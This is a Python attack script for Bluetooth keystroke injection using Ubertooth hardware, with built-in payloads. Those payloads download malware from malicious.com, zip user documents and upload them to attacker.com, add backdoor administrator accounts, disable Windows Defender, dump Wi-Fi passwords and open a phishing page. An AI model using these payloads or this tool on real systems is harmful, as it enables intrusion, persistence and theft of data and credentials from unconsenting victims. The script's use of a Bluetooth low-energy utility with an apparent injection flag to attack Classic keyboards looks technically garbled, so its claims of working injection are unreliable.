import argparse
import subprocess
import time
import json

"""
Ubertooth Bluetooth Keystroke Injection (Enhanced with More Attack Payloads)

Features:
    - Captures HID (keyboard) packets from Bluetooth Classic keyboards.
    - Injects keystrokes into a target Bluetooth keyboard.
    - Spoofs legitimate Bluetooth HID input events.
    - Executes predefined attack payloads (e.g., open terminal, execute commands, exfiltrate files).
    - Logs injected keystrokes and tracks responses.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle

Usage:
    - Scan for Bluetooth Classic keyboards:
      python ubertooth_keystroke_inject.py --scan
    - Capture and log HID packets from a Bluetooth keyboard:
      python ubertooth_keystroke_inject.py --capture --log bt_keyboard_hid.pcap
    - Replay captured HID packets (keystroke injection):
      python ubertooth_keystroke_inject.py --inject --input bt_keyboard_hid.pcap --target AA:BB:CC:DD:EE:FF
    - Send a custom keystroke payload to a Bluetooth keyboard:
      python ubertooth_keystroke_inject.py --inject --target AA:BB:CC:DD:EE:FF --payload "Hello World!"
    - Execute a built-in attack payload (e.g., exfiltrate Wi-Fi passwords):
      python ubertooth_keystroke_inject.py --inject --target AA:BB:CC:DD:EE:FF --attack steal_wifi_passwords
"""

HID_PAYLOADS = {
    "open_terminal": ["CTRL+ALT+T"],  # Linux/macOS Terminal Shortcut
    "windows_cmd": ["WIN+R", "cmd", "ENTER"],  # Open Windows Run & CMD
    "download_malware": [
        "WIN+R", "powershell", "ENTER",
        "Invoke-WebRequest -Uri http://malicious.com/malware.exe -OutFile C:\\malware.exe", "ENTER"
    ],
    "create_persistence": [
        "WIN+R", "cmd", "ENTER",
        "net user backdoor P@ssw0rd /add", "ENTER",
        "net localgroup administrators backdoor /add", "ENTER"
    ],
    "steal_wifi_passwords": [
        "WIN+R", "cmd", "ENTER",
        "netsh wlan show profile name=* key=clear", "ENTER"
    ],
    "exfiltrate_files": [
        "WIN+R", "cmd", "ENTER",
        "powershell -Command Compress-Archive -Path C:\\Users\\*\\Documents\\* -DestinationPath C:\\Windows\\Temp\\exfil.zip", "ENTER",
        "powershell -Command Invoke-WebRequest -Uri http://attacker.com/upload -Method POST -InFile C:\\Windows\\Temp\\exfil.zip", "ENTER"
    ],
    "add_admin_user": [
        "WIN+R", "cmd", "ENTER",
        "net user hacker Password123 /add", "ENTER",
        "net localgroup administrators hacker /add", "ENTER"
    ],
    "disable_defender": [
        "WIN+R", "powershell", "ENTER",
        "Set-MpPreference -DisableRealtimeMonitoring $true", "ENTER"
    ],
    "open_hidden_browser": [
        "WIN+R", "cmd", "ENTER",
        "start /min chrome.exe http://attacker.com/phishing_page", "ENTER"
    ]
}

def scan_bluetooth_keyboards():
    """Scans for Bluetooth Classic keyboards."""
    print("[INFO] Scanning for Bluetooth Classic HID devices...")

    try:
        output = subprocess.check_output(["ubertooth-rx", "-s"])
        devices = output.decode("utf-8").split("\n")

        for line in devices:
            if "HID" in line or "Keyboard" in line:
                print(f"[DETECTED] Bluetooth Keyboard: {line.strip()}")

    except Exception as e:
        print(f"[ERROR] Failed to scan for Bluetooth keyboards: {e}")

def capture_hid_traffic(log_file):
    """Captures Bluetooth HID (keyboard) traffic and logs it."""
    print(f"[INFO] Capturing Bluetooth HID packets (Logging to {log_file})...")

    try:
        output = subprocess.check_output(["ubertooth-rx", "-f"])
        packets = output.decode("utf-8").split("\n")

        hid_packets = [line for line in packets if "HID" in line or "KEYBOARD" in line]

        if hid_packets:
            with open(log_file, "w") as f:
                json.dump(hid_packets, f, indent=4)
            print(f"[SUCCESS] Captured {len(hid_packets)} HID packets saved to {log_file}")
        else:
            print("[WARNING] No HID packets captured.")

    except Exception as e:
        print(f"[ERROR] Failed to capture HID packets: {e}")

def inject_keystrokes(target_mac, payload=None, input_file=None, attack=None):
    """Injects keystrokes into a Bluetooth keyboard."""
    print(f"[INFO] Injecting keystrokes to {target_mac}...")

    try:
        if attack and attack in HID_PAYLOADS:
            payload = HID_PAYLOADS[attack]
            print(f"[INFO] Using predefined attack payload: {attack}")

        elif input_file:
            with open(input_file, "r") as f:
                captured_keystrokes = json.load(f)
                payload = [packet.split("KEYBOARD: ")[1] for packet in captured_keystrokes if "KEYBOARD" in packet]

        if not payload:
            print("[ERROR] No payload provided.")
            return

        for keystroke in payload:
            print(f"[INJECTING] {keystroke}")
            subprocess.run(["ubertooth-btle", "-t", target_mac, "--hid", keystroke])
            time.sleep(0.5)  # Small delay between keystrokes

        print(f"[SUCCESS] Keystroke injection completed on {target_mac}.")

    except Exception as e:
        print(f"[ERROR] Failed to inject keystrokes: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Bluetooth Keystroke Injection")
    parser.add_argument("--scan", action="store_true", help="Scan for Bluetooth Classic keyboards")
    parser.add_argument("--capture", action="store_true", help="Capture HID packets from a Bluetooth keyboard")
    parser.add_argument("--log", type=str, help="Log file to save captured HID packets")
    parser.add_argument("--inject", action="store_true", help="Inject keystrokes into a Bluetooth keyboard")
    parser.add_argument("--target", type=str, help="MAC address of the Bluetooth keyboard to inject into")
    parser.add_argument("--payload", type=str, help="Custom keystroke payload to inject")
    parser.add_argument("--input", type=str, help="Input file with captured HID packets for replay")
    parser.add_argument("--attack", type=str, help="Use a predefined attack payload (e.g., steal_wifi_passwords, exfiltrate_files)")

    args = parser.parse_args()

    if args.scan:
        scan_bluetooth_keyboards()
    elif args.capture and args.log:
        capture_hid_traffic(args.log)
    elif args.inject and args.target:
        inject_keystrokes(args.target, payload=args.payload, input_file=args.input, attack=args.attack)
    else:
        print("[ERROR] No valid mode selected! Use --scan, --capture with --log, or --inject with --target.")
